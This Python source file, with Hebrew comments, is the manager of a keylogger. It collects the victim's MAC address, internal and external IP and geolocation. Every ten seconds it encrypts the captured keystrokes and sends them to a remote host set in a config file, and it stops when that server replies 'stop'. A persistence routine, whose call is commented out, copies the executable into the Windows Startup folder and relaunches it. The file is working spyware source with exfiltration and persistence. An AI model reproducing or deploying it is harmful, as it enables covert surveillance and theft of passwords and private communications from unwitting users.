import json
from keylogger_service import KeyloggerService
from encryptor import Encryptor
from network_writer import NetworkWriter
from getmac import get_mac_address
import requests
import socket
import time
import os
import shutil

class KeyloggerManager:

    def __init__(self,host:str,key:str):
        self.active = True
        self.keylogger = KeyloggerService()
        self.encryptor = Encryptor(key)
        self.writer = NetworkWriter(host)
        self.wrapper = self.wrapper_fill()
        # self.copy_file()
        self.main()


    def wrapper_fill(self):
        # קבלת נתונים על המחשב
        mac_name = self.get_mac_details()
        internal_ip, external_ip = self.get_ip_details()
        location = self.get_computer_location()
        wrapper = {"mac_name": mac_name,
                   "internal_ip": internal_ip,
                   "external_ip": external_ip,
                   "location": location,
                   "data": {}}
        return wrapper

    def main(self) ->None:

        while self.active:
            try:
                #הזמן בין כל קבלת נתונים
                time.sleep(10)
                #קבלת הנתונים מהkeyloggerservice
                data = self.keylogger.data
                #הכנסת הנתונים לwrapper
                self.wrapper["data"].update(data)
                # הצפנת הנתונים
                wrapper = self.encryptor.encrypt(self.wrapper)
                #שליחת הנתונים וקבלת תשובה
                response = self.writer.send_data(wrapper)
                if response == "stop":
                    self.stop()
                elif response == "error":
                    pass
                else:
                    self.wrapper["data"] = {}

            except Exception as e:
                print(e)
                pass


    @staticmethod
    def get_mac_details() -> str:
        return get_mac_address()

    @staticmethod
    def get_ip_details() ->tuple:
        internal_ip = socket.gethostbyname(socket.gethostname())
        try: external_ip = requests.get("https://api64.ipify.org?format=json",timeout=5).json()["ip"]
        except: external_ip = "Unknown"
        return internal_ip,external_ip

    def get_computer_location(self) -> str:
        url = "http://ip-api.com/json/"
        try:
            response = requests.get(url)
            data = response.json()

            if data["status"] == "success":
                return f"Country: {data['country']} Region: {data['regionName']} City:{data['city']}"
            else:
                return "Not found location"
        except:
            return "Location service unavailable"

    def stop(self) -> None:
        self.active = False

    @staticmethod
    def copy_file():
        source = "keylogger_manager.exe" #יצירת שם קובץ להעתקה
        startup_dir = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup') #יצירת נתיב לתיקיית התחל של המחשב
        destination = os.path.join(startup_dir, os.path.basename(source)) #יצירת נתיב ליצרית קובץ

        try:
            if not os.path.exists(destination):
                shutil.copy2(source, destination) #העתקת הקובץ לתפריט ההתחלה
                os.startfile(destination) #הפעלת הקובץ מתפריט ההתחלה
                os._exit(0) #כיבוי הקובץ הקיים כדי שלא יהיה כפול
        except:
            pass


if __name__ == '__main__':
    #קבלת הנתיב רשת והמפתח להצפנה
    with open("../config.json",'r')as file:
        data = json.load(file)
        host = data["host"]
        key = data["key"]

    keylogger = KeyloggerManager(host,key)





